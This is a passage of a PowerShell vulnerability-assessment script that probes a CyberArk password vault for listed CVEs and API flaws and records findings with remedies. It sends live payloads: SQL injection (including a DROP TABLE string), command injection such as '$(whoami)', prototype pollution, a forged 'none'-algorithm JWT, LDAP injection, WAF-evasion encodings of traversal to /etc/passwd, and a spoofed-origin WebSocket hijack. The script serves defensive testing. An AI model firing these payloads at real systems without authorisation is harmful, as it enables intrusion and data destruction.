                    -Finding "XSS vulnerability via modalDlgMsgInternal (CVE-2025-22272)" `
                    -Resource $payload `
                    -CurrentValue "Script tags reflected in response" `
                    -ExpectedValue "Input properly sanitized" `
                    -Recommendation "Apply CyberArk security patch for CVE-2025-22272" `
                    -Severity "High"
            }
        }
        catch { }
    }

    # CVE-2025-22273 - Password change brute force (no rate limiting)
    Write-AuditLog "Testing for password change rate limiting (CVE-2025-22273)..." -Level Info

    $changePasswordEndpoints = @(
        "/PasswordVault/api/Users/ChangePassword",
        "/PasswordVault/WebServices/PIMServices.svc/User/ChangePassword",
        "/PasswordVault/v10/Users/ChangePassword"
    )

    foreach ($endpoint in $changePasswordEndpoints) {
        try {
            $testRequests = @()
            for ($i = 0; $i -lt 5; $i++) {
                $start = Get-Date
                $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method POST -Body '{"oldPassword":"test","newPassword":"test123"}' -ContentType "application/json" -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
                $testRequests += (Get-Date) - $start
            }

            # Check if all requests completed quickly (no rate limiting)
            $avgTime = ($testRequests | Measure-Object -Property TotalMilliseconds -Average).Average
            if ($avgTime -lt 500) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE10" `
                    -Finding "No rate limiting on password change endpoint (CVE-2025-22273 risk)" `
                    -Resource $endpoint `
                    -CurrentValue "Average response: ${avgTime}ms for 5 requests" `
                    -ExpectedValue "Rate limiting or delays implemented" `
                    -Recommendation "Implement rate limiting on password change endpoints" `
                    -Severity "Medium"
            }
        }
        catch { }
    }

    # CVE-2025-22274 - HTML injection in Application definition
    $htmlInjectionPayloads = @(
        @{ Path = "/PasswordVault/api/Applications"; Body = '{"Name":"test<h1>injected</h1>"}' },
        @{ Path = "/PasswordVault/WebServices/PIMServices.svc/Applications"; Body = '<Application><Name>test<h1>injected</h1></Name></Application>' }
    )

    foreach ($payload in $htmlInjectionPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method POST -Body $payload.Body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.Content -match "<h1>injected</h1>") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE11" `
                    -Finding "HTML injection in Application definition (CVE-2025-22274)" `
                    -Resource $payload.Path `
                    -CurrentValue "HTML content accepted and reflected" `
                    -ExpectedValue "HTML properly escaped or rejected" `
                    -Recommendation "Apply input validation and output encoding" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

function Test-CVE2025SecretsManager {
    Write-AuditLog "Checking for 2025 Secrets Manager CVEs (CVE-2025-49827 through CVE-2025-49831)..." -Level Info

    # CVE-2025-49827 - IAM Authenticator Bypass (Critical)
    # Test for weak IAM authentication configuration
    $iamEndpoints = @(
        "/authn-iam",
        "/authn-azure",
        "/authn-gcp",
        "/authn-jwt",
        "/authn-k8s"
    )

    # Check if Conjur/Secrets Manager endpoints are accessible
    $conjurPorts = @(443, 8443, 5432)
    $pvwaHost = ([System.Uri]$PVWA).Host

    foreach ($port in $conjurPorts) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($pvwaHost, $port)
            if ($tcpClient.Connected) {
                $tcpClient.Close()

                # Try to access authenticator endpoints
                foreach ($endpoint in $iamEndpoints) {
                    try {
                        $response = Invoke-WebRequest -Uri "https://${pvwaHost}:${port}$endpoint" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

                        if ($response.StatusCode -eq 200) {
                            Add-Finding -Category "CVE Assessment" `
                                -CISControl "CVE12" `
                                -Finding "Secrets Manager authenticator endpoint accessible (CVE-2025-49827 risk)" `
                                -Resource "https://${pvwaHost}:${port}$endpoint" `
                                -CurrentValue "Endpoint responds - verify IAM configuration is secure" `
                                -ExpectedValue "Authenticators properly configured and secured" `
                                -Recommendation "Review IAM authenticator configuration and apply patches for CVE-2025-49827" `
                                -Severity "High"
                        }
                    }
                    catch { }
                }
            }
        }
        catch { }
    }

    # CVE-2025-49828 - Remote Code Execution
    # Check for vulnerable API patterns that could allow RCE
    $rcePayloads = @(
        @{ Path = "/api/v1/secrets"; Method = "POST"; Body = '{"id":"test;id"}' },
        @{ Path = "/api/v1/policies"; Method = "POST"; Body = '{"policy":"- !host $(whoami)"}' }
    )

    foreach ($payload in $rcePayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method $payload.Method -Body $payload.Body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            # Check for signs of command execution
            if ($response.Content -match "uid=|root:|command not found") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE13" `
                    -Finding "Potential RCE vulnerability pattern (CVE-2025-49828)" `
                    -Resource $payload.Path `
                    -CurrentValue "Command injection patterns may be processed" `
                    -ExpectedValue "Input properly sanitized" `
                    -Recommendation "Apply security patches for CVE-2025-49828 immediately" `
                    -Severity "Critical"
            }
        }
        catch { }
    }

    # CVE-2025-49831 - Network Misconfiguration Bypass
    # Check for network segmentation issues
    $internalEndpoints = @(
        "/health",
        "/info",
        "/metrics",
        "/api/v1/whoami",
        "/api/v1/resources"
    )

    foreach ($endpoint in $internalEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200 -and $response.Content.Length -gt 0) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE14" `
                    -Finding "Internal endpoint accessible from external network (CVE-2025-49831 risk)" `
                    -Resource $endpoint `
                    -CurrentValue "Endpoint accessible: $($response.Content.Substring(0, [Math]::Min(100, $response.Content.Length)))..." `
                    -ExpectedValue "Internal endpoints not accessible externally" `
                    -Recommendation "Review network segmentation and apply CVE-2025-49831 patches" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-CVE202438996 {
    Write-AuditLog "Checking for CVE-2024-38996 (Prototype Pollution in PVWA)..." -Level Info

    # Prototype pollution test payloads
    $protoPayloads = @(
        @{ Path = "/PasswordVault/api/Users"; Method = "POST"; Body = '{"__proto__":{"admin":true}}' },
        @{ Path = "/PasswordVault/api/Safes"; Method = "POST"; Body = '{"constructor":{"prototype":{"isAdmin":true}}}' },
        @{ Path = "/PasswordVault/api/auth"; Method = "POST"; Body = '{"username":"test","password":"test","__proto__":{"authenticated":true}}' }
    )

    foreach ($payload in $protoPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method $payload.Method -Body $payload.Body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            # Check if prototype pollution had any effect
            if ($response.Content -match '"admin"\s*:\s*true|"isAdmin"\s*:\s*true|"authenticated"\s*:\s*true') {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE15" `
                    -Finding "Potential prototype pollution vulnerability (CVE-2024-38996)" `
                    -Resource $payload.Path `
                    -CurrentValue "Prototype properties may be processed" `
                    -ExpectedValue "__proto__ and constructor properties rejected" `
                    -Recommendation "Upgrade PVWA to version 14.2.4 or later" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

function Test-CA25Bulletins {
    Write-AuditLog "Checking for CyberArk Security Bulletins (CA25 series)..." -Level Info

    # CA25-25 - DoS via resource consumption (Secrets Manager SaaS Edge)
    Write-AuditLog "Testing for CA25-25 (DoS vulnerability)..." -Level Info

    # CA25-32 - CCP Sensitive Information Disclosure
    $ccpEndpoints = @(
        "/AIMWebService/api/Accounts",
        "/AIMWebService/v1.1/aim/accounts",
        "/WebServices/PIMServices.svc/Applications"
    )

    foreach ($endpoint in $ccpEndpoints) {
        try {
            # Test without authentication
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CA25-32" `
                    -Finding "CCP endpoint accessible without authentication (CA25-32 risk)" `
                    -Resource $endpoint `
                    -CurrentValue "Endpoint responds to unauthenticated requests" `
                    -ExpectedValue "Proper authentication required" `
                    -Recommendation "Apply patches for CA25-32 and ensure CCP requires authentication" `
                    -Severity "High"
            }
        }
        catch { }
    }

    # CA25-34 - HTML5 Gateway DoS
    $html5GatewayEndpoints = @(
        "/guacamole/",
        "/psmgw/",
        "/PSMGWService/"
    )

    foreach ($endpoint in $html5GatewayEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CA25-34" `
                    -Finding "HTML5 Gateway endpoint detected (CA25-34 - verify patched)" `
                    -Resource $endpoint `
                    -CurrentValue "HTML5 Gateway accessible" `
                    -ExpectedValue "Patched version 14.6 or later" `
                    -Recommendation "Verify HTML5 Gateway is patched for CA25-34 DoS vulnerability" `
                    -Severity "Medium"
            }
        }
        catch { }
    }

    # CA25-35 - PSM-SSH Race Condition DoS
    $psmSshPorts = @(22, 2022, 22022)
    $pvwaHost = ([System.Uri]$PVWA).Host

    foreach ($port in $psmSshPorts) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($pvwaHost, $port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)

            if ($wait -and $tcpClient.Connected) {
                $tcpClient.Close()
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CA25-35" `
                    -Finding "PSM-SSH port open (CA25-35 - verify patched)" `
                    -Resource "${pvwaHost}:${port}" `
                    -CurrentValue "SSH port accessible" `
                    -ExpectedValue "Patched version 14.6.1 or later" `
                    -Recommendation "Verify PSM-SSH is patched for CA25-35 race condition DoS" `
                    -Severity "Medium"
            }
        }
        catch { }
        finally {
            if ($tcpClient) { $tcpClient.Close() }
        }
    }
}

#======================================================================
# API SECURITY CHECKS
#======================================================================

function Test-APISecurity {
    Write-AuditLog "Testing API security controls..." -Level Info

    # Test for broken object level authorization (BOLA/IDOR)
    try { Test-BOLA } catch { Add-SkippedCheck -Category "API Security" -CISControl "API3" -CheckName "BOLA/IDOR Testing" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    # Test for mass assignment vulnerabilities
    try { Test-MassAssignment } catch { Add-SkippedCheck -Category "API Security" -CISControl "API4" -CheckName "Mass Assignment Testing" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    # Test for injection vulnerabilities
    try { Test-APIInjection } catch { Add-SkippedCheck -Category "API Security" -CISControl "API2" -CheckName "Injection Testing" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    # Test API versioning security
    try { Test-APIVersioning } catch { Add-SkippedCheck -Category "API Security" -CISControl "API5" -CheckName "API Versioning" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
}

function Test-BOLA {
    Write-AuditLog "Testing for Broken Object Level Authorization (BOLA)..." -Level Info

    # Try to access resources with modified IDs
    $bolaEndpoints = @(
        "/PasswordVault/api/Accounts/1",
        "/PasswordVault/api/Accounts/0",
        "/PasswordVault/api/Accounts/-1",
        "/PasswordVault/api/Accounts/999999",
        "/PasswordVault/api/Users/1",
        "/PasswordVault/api/Users/Administrator",
        "/PasswordVault/api/Safes/System",
        "/PasswordVault/api/Safes/VaultInternal"
    )

    foreach ($endpoint in $bolaEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "API Security" `
                    -CISControl "API3" `
                    -Finding "Potential BOLA/IDOR vulnerability" `
                    -Resource $endpoint `
                    -CurrentValue "Resource accessible without authentication" `
                    -ExpectedValue "401/403 Unauthorized" `
                    -Recommendation "Implement proper authorization checks" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-MassAssignment {
    Write-AuditLog "Testing for mass assignment vulnerabilities..." -Level Info

    # Attempt to include admin-level properties in requests
    $massAssignmentPayloads = @(
        @{ Endpoint = "/PasswordVault/api/Users"; Method = "POST"; Body = @{ username = "testuser"; isAdmin = $true; vaultAuthorization = @("AddSafes", "ManageServerFileCategories") } },
        @{ Endpoint = "/PasswordVault/api/Accounts"; Method = "POST"; Body = @{ name = "test"; secretType = "password"; privileged = $true } }
    )

    foreach ($payload in $massAssignmentPayloads) {
        try {
            $body = $payload.Body | ConvertTo-Json
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Endpoint)" -Method $payload.Method -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            # If we get anything other than 401/403, flag it
            if ($response.StatusCode -notin @(401, 403, 400)) {
                Add-Finding -Category "API Security" `
                    -CISControl "API4" `
                    -Finding "Potential mass assignment vulnerability" `
                    -Resource $payload.Endpoint `
                    -CurrentValue "Privileged properties accepted" `
                    -ExpectedValue "Privileged properties rejected" `
                    -Recommendation "Implement strict input validation and property whitelisting" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-APIInjection {
    Write-AuditLog "Testing for API injection vulnerabilities..." -Level Info

    # SQL Injection patterns
    $sqlInjectionPayloads = @(
        "/PasswordVault/api/Accounts?search=' OR '1'='1",
        "/PasswordVault/api/Accounts?search=1; DROP TABLE accounts--",
        "/PasswordVault/api/Safes?search=' UNION SELECT * FROM users--",
        "/PasswordVault/api/Users?search=admin'--"
    )

    foreach ($payload in $sqlInjectionPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            # Check for SQL error messages
            if ($response.Content -match "SQL|syntax|mysql|oracle|postgresql|sqlite|exception|error") {
                Add-Finding -Category "API Security" `
                    -CISControl "API2" `
                    -Finding "Potential SQL injection vulnerability" `
                    -Resource $payload `
                    -CurrentValue "SQL error/syntax message in response" `
                    -ExpectedValue "Generic error message" `
                    -Recommendation "Use parameterized queries and input validation" `
                    -Severity "Critical"
            }
        }
        catch {
            $errorResponse = $_.Exception.Response
            if ($errorResponse) {
                try {
                    $reader = New-Object System.IO.StreamReader($errorResponse.GetResponseStream())
                    $errorBody = $reader.ReadToEnd()
                    if ($errorBody -match "SQL|syntax|mysql|oracle") {
                        Add-Finding -Category "API Security" `
                            -CISControl "API2" `
                            -Finding "SQL injection error disclosure" `
                            -Resource $payload `
                            -CurrentValue "SQL error in error response" `
                            -ExpectedValue "Generic error" `
                            -Recommendation "Implement proper error handling" `
                            -Severity "Critical"
                    }
                }
                catch { }
            }
        }
    }

    # LDAP Injection patterns
    $ldapInjectionPayloads = @(
        "/PasswordVault/api/Users?search=*)(uid=*))(|(uid=*",
        "/PasswordVault/api/Users?search=admin)(&(password=*))"
    )

    foreach ($payload in $ldapInjectionPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200 -and $response.Content.Length -gt 100) {
                Add-Finding -Category "API Security" `
                    -CISControl "API2" `
                    -Finding "Potential LDAP injection vulnerability" `
                    -Resource $payload `
                    -CurrentValue "LDAP query accepted malformed input" `
                    -ExpectedValue "Input validation error" `
                    -Recommendation "Implement LDAP input sanitization" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-APIVersioning {
    Write-AuditLog "Testing API versioning security..." -Level Info

    # Check for deprecated/vulnerable API versions
    $apiVersions = @(
        @{ Path = "/PasswordVault/WebServices/PIMServices.svc"; Version = "SOAP (deprecated)"; Severity = "Medium" },
        @{ Path = "/PasswordVault/API/"; Version = "Legacy REST"; Severity = "Low" },
        @{ Path = "/PasswordVault/api/v1/"; Version = "v1 (old)"; Severity = "Low" },
        @{ Path = "/PasswordVault/api/v9/"; Version = "v9"; Severity = "Info" },
        @{ Path = "/PasswordVault/api/v10/"; Version = "v10"; Severity = "Info" },
        @{ Path = "/PasswordVault/api/v11/"; Version = "v11"; Severity = "Info" },
        @{ Path = "/PasswordVault/api/v12/"; Version = "v12 (current)"; Severity = "Info" }
    )

    foreach ($api in $apiVersions) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($api.Path)" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200 -or $response.StatusCode -eq 401) {
                if ($api.Severity -ne "Info") {
                    Add-Finding -Category "API Security" `
                        -CISControl "API5" `
                        -Finding "Legacy API version accessible" `
                        -Resource $api.Path `
                        -CurrentValue "$($api.Version) - Active" `
                        -ExpectedValue "Only current API version" `
                        -Recommendation "Disable legacy API endpoints" `
                        -Severity $api.Severity
                }
            }
        }
        catch { }
    }
}

#======================================================================
# ADVANCED RED TEAM TESTING FUNCTIONS (v4.2)
#======================================================================

function Test-TimingAttacks {
    <#
    .SYNOPSIS
        Tests for timing-based vulnerabilities that could leak information
    #>
    Write-AuditLog "Running timing attack analysis..." -Level Info

    # Test for timing differences in authentication
    $validUsernames = @("Administrator", "admin", "Auditor")
    $invalidUsernames = @("nonexistent_user_12345", "definitely_not_a_real_user")

    $validTimes = @()
    $invalidTimes = @()

    foreach ($username in $validUsernames) {
        try {
            $body = @{ username = $username; password = "timing_test_password" } | ConvertTo-Json
            $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/Auth/CyberArk/Logon" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction SilentlyContinue
            $stopwatch.Stop()
            $validTimes += $stopwatch.ElapsedMilliseconds
            Add-RequestDelay
        }
        catch {
            $stopwatch.Stop()
            $validTimes += $stopwatch.ElapsedMilliseconds
        }
    }

    foreach ($username in $invalidUsernames) {
        try {
            $body = @{ username = $username; password = "timing_test_password" } | ConvertTo-Json
            $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/Auth/CyberArk/Logon" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction SilentlyContinue
            $stopwatch.Stop()
            $invalidTimes += $stopwatch.ElapsedMilliseconds
            Add-RequestDelay
        }
        catch {
            $stopwatch.Stop()
            $invalidTimes += $stopwatch.ElapsedMilliseconds
        }
    }

    if ($validTimes.Count -gt 0 -and $invalidTimes.Count -gt 0) {
        $validAvg = ($validTimes | Measure-Object -Average).Average
        $invalidAvg = ($invalidTimes | Measure-Object -Average).Average
        $timeDiff = [Math]::Abs($validAvg - $invalidAvg)

        if ($timeDiff -gt $script:Config.TimingVarianceThresholdMs) {
            Add-Finding -Category "Timing Attack" `
                -CISControl "API1" `
                -Finding "Potential timing-based user enumeration" `
                -Resource "Authentication Endpoint" `
                -CurrentValue "Valid user avg: ${validAvg}ms, Invalid user avg: ${invalidAvg}ms (diff: ${timeDiff}ms)" `
                -ExpectedValue "Consistent response times regardless of user validity" `
                -Recommendation "Implement constant-time comparison for authentication" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "Timing Attack" `
                -CISControl "API1" `
                -Finding "Authentication timing appears consistent" `
                -Resource "Authentication Endpoint" `
                -CurrentValue "Time variance: ${timeDiff}ms (within threshold)" `
                -ExpectedValue "Consistent response times" `
                -Severity "Info" `
                -Status "Pass"
        }
    }

    # Test for blind SQL injection via timing
    if (-not $OPSECMode) {
        $blindSqlPayloads = @(
            "/PasswordVault/api/Accounts?search=test';WAITFOR DELAY '0:0:3'--",
            "/PasswordVault/api/Accounts?search=test' AND SLEEP(3)--",
            "/PasswordVault/api/Accounts?search=test' AND pg_sleep(3)--"
        )

        foreach ($payload in $blindSqlPayloads) {
            try {
                $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
                $stopwatch.Stop()

                if ($stopwatch.ElapsedMilliseconds -gt 3000) {
                    Add-Finding -Category "Timing Attack" `
                        -CISControl "API2" `
                        -Finding "Potential blind SQL injection via timing" `
                        -Resource $payload `
                        -CurrentValue "Response delayed by $($stopwatch.ElapsedMilliseconds)ms" `
                        -ExpectedValue "Consistent fast response" `
                        -Recommendation "Implement parameterized queries and input validation" `
                        -Severity "Critical"
                }
                Add-RequestDelay
            }
            catch { }
        }
    }
}

function Test-JWTSecurity {
    <#
    .SYNOPSIS
        Tests for JWT token vulnerabilities including none algorithm, weak signing, etc.
    #>
    Write-AuditLog "Testing JWT/OAuth2 security..." -Level Info

    # Check for JWT endpoints
    $jwtEndpoints = @(
        "/PasswordVault/api/oauth2/token",
        "/PasswordVault/api/Auth/OIDC/Logon",
        "/PasswordVault/api/Auth/SAML/Logon",
        "/PasswordVault/WebServices/auth/oauth2/token",
        "/.well-known/openid-configuration",
        "/PasswordVault/.well-known/openid-configuration"
    )

    foreach ($endpoint in $jwtEndpoints) {
        try {
            $response = Invoke-OPSECWebRequest -Uri "$PVWA$endpoint" -Method GET -TimeoutSec 10

            if ($response.Success -and $response.StatusCode -in @(200, 401, 400)) {
                Add-Finding -Category "JWT Security" `
                    -CISControl "API1" `
                    -Finding "JWT/OAuth2 endpoint detected" `
                    -Resource $endpoint `
                    -CurrentValue "Endpoint responds (HTTP $($response.StatusCode))" `
                    -ExpectedValue "JWT endpoints secured" `
                    -Severity "Info" `
                    -Status "Pass"

                # If OIDC config, check for security issues
                if ($endpoint -match "openid-configuration" -and $response.Content) {
                    $oidcConfig = $response.Content | ConvertFrom-Json -ErrorAction SilentlyContinue
                    if ($oidcConfig) {
                        # Check for insecure algorithms
                        if ($oidcConfig.id_token_signing_alg_values_supported -contains "none" -or
                            $oidcConfig.id_token_signing_alg_values_supported -contains "HS256") {
                            Add-Finding -Category "JWT Security" `
                                -CISControl "API1" `
                                -Finding "Weak JWT signing algorithms supported" `
                                -Resource $endpoint `
                                -CurrentValue "Algorithms: $($oidcConfig.id_token_signing_alg_values_supported -join ', ')" `
                                -ExpectedValue "RS256, ES256 only" `
                                -Recommendation "Disable 'none' and HS256 algorithms" `
                                -Severity "High"
                        }
                    }
                }
            }
        }
        catch { }
    }

    # Test for JWT none algorithm bypass
    $noneAlgToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJWYXVsdEFkbWluIiwiaWF0IjoxNzA1MDAwMDAwfQ."

    try {
        $headers = @{ "Authorization" = "Bearer $noneAlgToken" }
        $response = Invoke-OPSECWebRequest -Uri "$PVWA/PasswordVault/api/Users" -Method GET -Headers $headers -TimeoutSec 10

        if ($response.Success -and $response.StatusCode -eq 200) {
            Add-Finding -Category "JWT Security" `
                -CISControl "API1" `
                -Finding "JWT 'none' algorithm bypass accepted" `
                -Resource "API Authorization" `
                -CurrentValue "Unsigned JWT token accepted" `
                -ExpectedValue "Only signed tokens accepted" `
                -Recommendation "Reject tokens with 'none' algorithm" `
                -Severity "Critical"
        }
    }
    catch { }

    # Test for JWT key confusion (RS256 -> HS256)
    $testToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJWYXVsdEFkbWluIn0.test"
    try {
        $headers = @{ "Authorization" = "Bearer $testToken" }
        $response = Invoke-OPSECWebRequest -Uri "$PVWA/PasswordVault/api/Users" -Method GET -Headers $headers -TimeoutSec 10

        # Check response for signs of algorithm confusion
        if ($response.StatusCode -notin @(401, 403)) {
            Add-Finding -Category "JWT Security" `
                -CISControl "API1" `
                -Finding "Potential JWT algorithm confusion vulnerability" `
                -Resource "API Authorization" `
                -CurrentValue "Unexpected response to crafted JWT" `
                -ExpectedValue "401/403 for invalid tokens" `
                -Recommendation "Explicitly validate JWT algorithm matches expected" `
                -Severity "High"
        }
    }
    catch { }
}

function Test-WebSocketSecurity {
    <#
    .SYNOPSIS
        Tests for WebSocket endpoint discovery and security issues
    #>
    Write-AuditLog "Testing WebSocket security..." -Level Info

    # Common WebSocket endpoints
    $wsEndpoints = @(
        "/PasswordVault/SignalR",
        "/PasswordVault/signalr/hubs",
        "/PasswordVault/signalr/negotiate",
        "/PasswordVault/ws",
        "/PasswordVault/websocket",
        "/PasswordVault/socket.io/",
        "/PasswordVault/live",
        "/guacamole/websocket-tunnel"
    )

    foreach ($endpoint in $wsEndpoints) {
        try {
            # Test HTTP upgrade request
            $headers = @{
                "Connection" = "Upgrade"
                "Upgrade"    = "websocket"
                "Sec-WebSocket-Version" = "13"
                "Sec-WebSocket-Key" = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((New-Guid).ToString().Substring(0, 16)))
            }

            $response = Invoke-OPSECWebRequest -Uri "$PVWA$endpoint" -Method GET -Headers $headers -TimeoutSec 10

            if ($response.StatusCode -eq 101 -or
                ($response.Headers -and $response.Headers["Upgrade"] -eq "websocket")) {
                Add-Finding -Category "WebSocket Security" `
                    -CISControl "NET1" `
                    -Finding "WebSocket endpoint discovered" `
                    -Resource $endpoint `
                    -CurrentValue "WebSocket upgrade successful" `
                    -ExpectedValue "WebSocket endpoints documented and secured" `
                    -Severity "Info" `
                    -Status "Pass"

                # Check for CSWSH (Cross-Site WebSocket Hijacking)
                $cswshHeaders = @{
                    "Connection" = "Upgrade"
                    "Upgrade"    = "websocket"
                    "Sec-WebSocket-Version" = "13"
                    "Sec-WebSocket-Key" = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((New-Guid).ToString().Substring(0, 16)))
                    "Origin" = "https://evil-attacker.com"
                }

                $cswshResponse = Invoke-OPSECWebRequest -Uri "$PVWA$endpoint" -Method GET -Headers $cswshHeaders -TimeoutSec 10

                if ($cswshResponse.StatusCode -eq 101) {
                    Add-Finding -Category "WebSocket Security" `
                        -CISControl "BB6" `
                        -Finding "Cross-Site WebSocket Hijacking (CSWSH) possible" `
                        -Resource $endpoint `
                        -CurrentValue "Accepts connections from arbitrary origins" `
                        -ExpectedValue "Origin validation required" `
                        -Recommendation "Implement strict Origin header validation for WebSocket connections" `
                        -Severity "High"
                }
            }
            elseif ($response.StatusCode -eq 200) {
                Add-Finding -Category "WebSocket Security" `
                    -CISControl "NET1" `
                    -Finding "Potential WebSocket/SignalR endpoint" `
                    -Resource $endpoint `
                    -CurrentValue "Endpoint responds (HTTP 200)" `
                    -ExpectedValue "Secured real-time endpoints" `
                    -Severity "Low"
            }
        }
        catch { }
    }
}

function Test-WAFEvasion {
    <#
    .SYNOPSIS
        Tests WAF/IDS bypass techniques to identify potential evasion vectors
    #>
    Write-AuditLog "Testing WAF/IDS evasion vectors..." -Level Info

    $basePayloads = @(
        @{ Type = "XSS"; Payload = "<script>alert(1)</script>" },
        @{ Type = "SQLi"; Payload = "' OR '1'='1" },
        @{ Type = "PathTraversal"; Payload = "../../../etc/passwd" },
        @{ Type = "CommandInjection"; Payload = "; id" }
    )

    $evasionTechniques = @(
        @{ Name = "DoubleURLEncode"; Encode = { param($s) [System.Web.HttpUtility]::UrlEncode([System.Web.HttpUtility]::UrlEncode($s)) } },
        @{ Name = "UnicodeEncode"; Encode = { param($s) ($s.ToCharArray() | ForEach-Object { "%u00" + [System.Convert]::ToString([int][char]$_, 16).PadLeft(2, '0') }) -join '' } },
        @{ Name = "MixedCase"; Encode = { param($s) -join ($s.ToCharArray() | ForEach-Object { if ((Get-Random -Maximum 2) -eq 0) { $_.ToString().ToUpper() } else { $_.ToString().ToLower() } }) } },
        @{ Name = "NullByteInjection"; Encode = { param($s) $s + "%00" } },
        @{ Name = "TabNewlineObfuscation"; Encode = { param($s) $s -replace ' ', '%09' } }
    )

    $bypassCount = 0
    $blockedCount = 0

    foreach ($basePayload in $basePayloads) {
        foreach ($technique in $evasionTechniques) {
            try {
                $encodedPayload = & $technique.Encode $basePayload.Payload
                $testUri = "$PVWA/PasswordVault/api/Accounts?search=$encodedPayload"

                $response = Invoke-OPSECWebRequest -Uri $testUri -Method GET -TimeoutSec 10

                # Check if payload bypassed WAF
                if ($response.StatusCode -notin @(403, 406, 429, 503)) {
                    if ($response.Content -match $basePayload.Payload -or
                        $response.Content -match "error|exception|syntax") {
                        $bypassCount++
                        Add-Finding -Category "WAF Evasion" `
                            -CISControl "BB11" `
                            -Finding "WAF bypass via $($technique.Name) encoding" `
                            -Resource "$($basePayload.Type) payload" `
                            -CurrentValue "Encoded payload processed (not blocked)" `
                            -ExpectedValue "Malicious payloads blocked by WAF" `
                            -Recommendation "Enhance WAF rules to detect encoded attack patterns" `
                            -Severity "High"
                    }
                }
                else {
                    $blockedCount++
                }
            }
            catch { }
        }
    }

    if ($bypassCount -eq 0 -and $blockedCount -gt 0) {
        Add-Finding -Category "WAF Evasion" `
            -CISControl "BB11" `
            -Finding "WAF appears to block evasion attempts" `
            -Resource "WAF Configuration" `
            -CurrentValue "$blockedCount payloads blocked" `
            -ExpectedValue "Comprehensive WAF protection" `
            -Severity "Info" `
            -Status "Pass"
    }

    # Test HTTP Parameter Pollution
    $hppPayloads = @(
        "/PasswordVault/api/Accounts?id=1&id=2",
        "/PasswordVault/api/Accounts?search=safe&search=admin",
        "/PasswordVault/api/Users?username=admin&username=test"
    )

    foreach ($payload in $hppPayloads) {
        try {
            $response = Invoke-OPSECWebRequest -Uri "$PVWA$payload" -Method GET -TimeoutSec 10

            if ($response.Success -and $response.StatusCode -eq 200) {
                Add-Finding -Category "WAF Evasion" `
                    -CISControl "API2" `
